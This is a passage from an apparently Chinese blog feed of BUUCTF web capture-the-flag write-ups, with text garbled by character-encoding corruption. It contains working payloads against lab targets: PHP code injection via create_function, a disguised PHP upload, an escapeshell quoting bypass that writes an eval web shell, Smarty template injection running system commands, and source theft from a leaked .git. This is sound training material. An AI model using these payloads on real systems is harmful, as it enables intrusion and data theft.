·çš„åˆ›å»ºå‡½æ•°è¿‡ç¨‹:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">function niming($a)&#123;  </span><br><span class="hljs-comment">       echo $id.&#x27;is&#x27;.$a;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">id=1;&#125;phpinfo();/*</span><br><span class="hljs-comment">å¯ä»¥çœ‹åˆ°phpinfoçš„ä¿¡æ¯ï¼›</span><br></code></pre></td></tr></table></figure><p> $code å’Œ $argå¯æ§å°±å¯ä»¥rceäº†ï¼Œå¯¹äºä»–ä»¬çš„å€¼æˆ‘ä»¬å¯ä»¥åœ¨line 39 <code>extract($_GET[&quot;flag&quot;]);</code>  è¿›è¡Œæ§åˆ¶ï¼Œå®ƒè´Ÿè´£æŠŠä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨</p><p>äºæ˜¯å¯ä»¥æœ‰   <code>flag[code]=&#125;a()//;&amp;flag[arg]=create_function</code> è¿™æ ·åŒ¿åå‡½æ•°ä½“å˜ä¸º</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> </span>&#123;<br>    <br>&#125;<br>a();<span class="hljs-comment">//&#125;</span><br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ <code>flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function</code> å°è¯•å°†å› ä¸ºåŒ…å«flag.phpè€Œå­˜åœ¨çš„å˜é‡è¾“å‡ºå‡ºæ¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>:?debu%<span class="hljs-number">3</span>Daqua_is_cute%<span class="hljs-number">0</span>A%<span class="hljs-number">26</span>file%<span class="hljs-number">3</span>Ddata%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ftext%<span class="hljs-number">2</span>Fplain%<span class="hljs-number">2</span>Cdebu_debu_aqua%<span class="hljs-number">26</span>shana%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>D<span class="hljs-number">1</span>%<span class="hljs-number">26</span>passwd%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>D<span class="hljs-number">2</span>%<span class="hljs-number">26</span>flag%<span class="hljs-number">5</span>Barg%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">7</span>Dvar_dump(get_defined_vars())%<span class="hljs-number">3</span>B%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">26</span>flag%<span class="hljs-number">5</span>Bcode%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>Dcreate_function<br><span class="hljs-attribute">POST</span>:debu=<span class="hljs-number">1</span>&amp;file=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282116024.png" alt="image-20220128211648854"></p><p>  hhhhhh  éº»äº†è¿™é¢˜åŠå¤©æ²¡å‡º æ¢æµè§ˆå™¨å‡ºäº†  çœŸæ­£çš„flagåœ¨ rea1f14g.php</p><p>ç„¶åç”¨ requireè¯»å–ï¼Œä¸æƒ³å†™äº†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>:?%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>_is_%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>A&amp;file=data://text/plain,%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>_%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>_%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>&amp;%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>%<span class="hljs-number">64</span>[]=<span class="hljs-number">2</span>&amp;%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>[%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>]=;&#125;require(~(%<span class="hljs-number">8</span>f%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>f%c<span class="hljs-number">5</span>%d<span class="hljs-number">0</span>%d<span class="hljs-number">0</span>%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%d<span class="hljs-number">0</span>%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">9</span>e%<span class="hljs-number">9</span>b%c<span class="hljs-number">2</span>%<span class="hljs-number">9</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%<span class="hljs-number">8</span>b%d<span class="hljs-number">1</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">9</span>e%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>a%c<span class="hljs-number">9</span>%cb%d<span class="hljs-number">2</span>%<span class="hljs-number">9</span>a%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>a%d<span class="hljs-number">0</span>%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">8</span>a%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>a%c<span class="hljs-number">2</span>%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">9</span>e%ce%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%cb%<span class="hljs-number">98</span>%d<span class="hljs-number">1</span>%<span class="hljs-number">8</span>f%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>f));//&amp;%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>[%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>]=create_function<br><span class="hljs-attribute">POST</span>:debu=<span class="hljs-number">1</span>&amp;file=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_web_ç¬¬äºŒé¡µwpåˆ†äº«</title>
    <link href="/2022/01/18/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E9%A1%B5wp%E5%88%86%E4%BA%AB/"/>
    <url>/2022/01/18/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E9%A1%B5wp%E5%88%86%E4%BA%AB/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>ä¸Šä¼  .htaccess ï¼ŒåŒæ—¶ä¿®æ”¹content-type ä¸º image/jpeg</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121403584.png" alt="image-20220112140343471"></p><p>/upload/b323290d2841ae288bfa9e1f60656229/.htaccess </p><p>æœ€åæ„å»ºæ•°æ®åŒ…å¦‚ä¸‹</p><figure class="highlight http"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>8a151de1-b4cf-42d2-8790-f818712a24fa.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>340<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://8a151de1-b4cf-42d2-8790-f818712a24fa.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryFifAOyg5pajYHOAX<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://8a151de1-b4cf-42d2-8790-f818712a24fa.node4.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6; PHPSESSID=a1410921a9c32d5b11729089df57ddda<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="pgsql"><span class="hljs-comment">------WebKitFormBoundaryFifAOyg5pajYHOAX</span></span><br><span class="pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;b.jpg&quot;</span><br><span class="pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpeg</span><br><span class="pgsql"></span><br><span class="pgsql">GIF89a</span><br><span class="pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>);&lt;/script&gt;</span><br><span class="pgsql"><span class="hljs-comment">------WebKitFormBoundaryFifAOyg5pajYHOAX</span></span><br><span class="pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="pgsql"></span><br><span class="pgsql">æ¶“å©ç´¶</span><br><span class="pgsql"><span class="hljs-comment">------WebKitFormBoundaryFifAOyg5pajYHOAX--</span></span><br></code></pre></td></tr></table></figure><p>è¯¥è¯´ä¸è¯´ readfileå‡½æ•°çœŸå¥½ç”¨</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>ç›®å‰åšJavaçš„é¢˜ç›®ä¹Ÿä¸ä¸å¤š</p><p>æƒ³åˆ°äº† <code>WEB-INF/web.xml</code> è¿™ä¸ªæ–‡ä»¶</p><p>ä½¿ç”¨å¦‚ä¸‹æ–¹å¼è®¿é—®å¹¶ä¸‹è½½ <code>WEB-INF/web.xml</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /Download?filename=WEB-INF/web.xml HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">470</span>bc<span class="hljs-number">6</span>ee-f<span class="hljs-number">24</span>b-<span class="hljs-number">46</span>f<span class="hljs-number">4</span>-<span class="hljs-number">8</span>b<span class="hljs-number">2</span>c-<span class="hljs-number">652724</span>aa<span class="hljs-number">6</span>dd<span class="hljs-number">8</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">470</span>bc<span class="hljs-number">6</span>ee-f<span class="hljs-number">24</span>b-<span class="hljs-number">46</span>f<span class="hljs-number">4</span>-<span class="hljs-number">8</span>b<span class="hljs-number">2</span>c-<span class="hljs-number">652724</span>aa<span class="hljs-number">6</span>dd<span class="hljs-number">8</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/Login<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Cookie</span>: UM_distinctid=<span class="hljs-number">17</span>ce<span class="hljs-number">3948</span>a<span class="hljs-number">50</span>a<span class="hljs-number">00</span>-<span class="hljs-number">06</span>fd<span class="hljs-number">4863146224</span>-<span class="hljs-number">561</span>a<span class="hljs-number">135</span>a-<span class="hljs-number">144000</span>-<span class="hljs-number">17</span>ce<span class="hljs-number">3948</span>a<span class="hljs-number">51</span>bb<span class="hljs-number">6</span>; JSESSIONID=<span class="hljs-number">182341</span>C<span class="hljs-number">534</span>F<span class="hljs-number">75</span>A<span class="hljs-number">7</span>F<span class="hljs-number">4</span>BA<span class="hljs-number">550740</span>A<span class="hljs-number">94645</span>E<br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121416763.png" alt="image-20220112141624678"></p><p>è¿™ä¸ªå¤§ä½¬å†™çš„çŸ¥è¯†ç‚¹å¾ˆä¸é”™ <a href="https://blog.csdn.net/ChenZIDu/article/details/103533554">https://blog.csdn.net/ChenZIDu/article/details/103533554</a></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•:<br><span class="hljs-regexp">/WEB-INF/</span>web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚<br><span class="hljs-regexp">/WEB-INF/</span>classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ <span class="hljs-keyword">class</span> æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet <span class="hljs-keyword">class</span> å’Œéservlet <span class="hljs-keyword">class</span>ï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­<br><span class="hljs-regexp">/WEB-INF/</span>lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br><span class="hljs-regexp">/WEB-INF/</span>src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚<br><span class="hljs-regexp">/WEB-INF/</span>database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶<br>æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­<span class="hljs-keyword">class</span>æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥<span class="hljs-keyword">class</span>æ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘<span class="hljs-keyword">class</span>æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç <br><br></code></pre></td></tr></table></figure><p>äºæ˜¯æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?filename=WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121420185.png" alt="image-20220112142047070"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>ç»å…¸ä¾‹é¢˜</p><p>åŸç†è®²è§£ï¼š<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><blockquote><ol><li>ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š<code>172.17.0.2&#39; -v -d a=1</code></li><li>ç»è¿‡<code>escapeshellarg</code>å¤„ç†åå˜æˆäº†<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</li><li>ç»è¿‡<code>escapeshellcmd</code>å¤„ç†åå˜æˆ<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œè¿™æ˜¯å› ä¸º<code>escapeshellcmd</code>å¯¹<code>\</code>ä»¥åŠæœ€åé‚£ä¸ª<strong>ä¸é…å¯¹å„¿</strong>çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼š<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>ï¼Œç”±äºä¸­é—´çš„<code>\\</code>è¢«è§£é‡Šä¸º<code>\</code>è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„<code>&#39;</code>æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„<code>&#39;</code>é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸º<code>curl 172.17.0.2\ -v -d a=1&#39;</code>ï¼Œå³å‘<code>172.17.0.2\</code>å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸º<code>a=1&#39;</code></li></ol></blockquote><p>å¤§è‡´å°±æ˜¯ escapeshellarg() escapeshellcmd()ä¸€èµ·ä½¿ç”¨å¯¼è‡´äº†å¼•å·çš„é€ƒé€¸ï¼ˆä¹Ÿä¸ç®—æ˜¯ï¼‰ï¼Œä½¿ç”¨nampçš„oGå‚æ•°å°†ç»“æœè¾“å‡ºåˆ°1.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?host=&#x27; &lt;?php @eval($_POST[1]);?&gt; -oG 1.php &#x27;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121431342.png" alt="image-20220112143117237"></p><p>å¦‚æ­¤å¾—åˆ°flag</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>ç§’äº†â€¦</p><p>åœ¨hints.phpå¤„å‘ç°æç¤º</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Do you know why i know your ip? --&gt;</span><br></code></pre></td></tr></table></figure><p>æ¨æ–­æ˜¯XFFå“ªé‡Œæœ‰åŠ¨ä½œï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯sqlæ³¨å…¥(è„‘å­è¿›æ°´æƒ³æ³•)ï¼Œç„¶åè¯•äº†è¯•SSTi</p><p>å°è¯•æ„é€ </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">X-Forwarded-For:&#123;&#123;1*7&#125;&#125;    å¾—åˆ° 7<br></code></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯Jinjaï¼Œç„¶åæ‹¿æ‰‹é‡Œçš„payloadè¯•äº†è¯• å‘ç°æ˜¯Smarty</p><p><code>X-Forwarded-For:&#123;if phpinfo()&#125;&#123;/if&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121701751.png" alt="image-20220112170118419"><br><code>X-Forwarded-For:&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121702617.png" alt="image-20220112170207322"></p><h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h2><p>è¿™é¢˜æ‰¾äº†åŠå¤©çº¿ç´¢æ²¡æ‰¾åˆ°ï¼Œè¿˜å‰© git svnæ²¡çœ‹ï¼Œå‘ç°å­˜åœ¨gitæ³„éœ²</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 GitHack.py http://5cb252e7-7d0a-4189-9441-061660212513.node4.buuoj.cn:81/.git/xxxxxxxxxx1 1python Gitpython2 GitHack.py http://5cb252e7-7d0a-4189-9441-061660212513.node4.buuoj.cn:81/.git/<br></code></pre></td></tr></table></figure><p>å¾—åˆ°æºç   index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<br>                <span class="hljs-comment">// echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„çœ‹ç¬¬å…­è¡Œçš„æ­£åˆ™<br><code>&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;</code>è¿™ä¸ªåœ°æ–¹ ?Rè¡¨ç¤ºå‰é¢çš„ä¸€æ®µçš„æ­£åˆ™ ä¹Ÿå°±æ˜¯ <code>[a-z,_]+([a-z,_])((?R)?\)</code>è¿™æ ·</p><p>æ‰€ä»¥ æœ€åä¹Ÿåªèƒ½æ˜¯ç±»ä¼¼è¿™ç§ print_r(show_source())ï¼Œå¯ä»¥ç¡®å®šæ˜¯æ— å‚æ•°rce</p><p>ç›´æ¥ç»™ç»“æœ <code>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p><p>å¤šè¯•å‡ æ¬¡å°±è¡Œ</p><h2 id="GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"><a href="#GWCTF-2019-æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“" class="headerlink" title="[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“"></a>[GWCTF 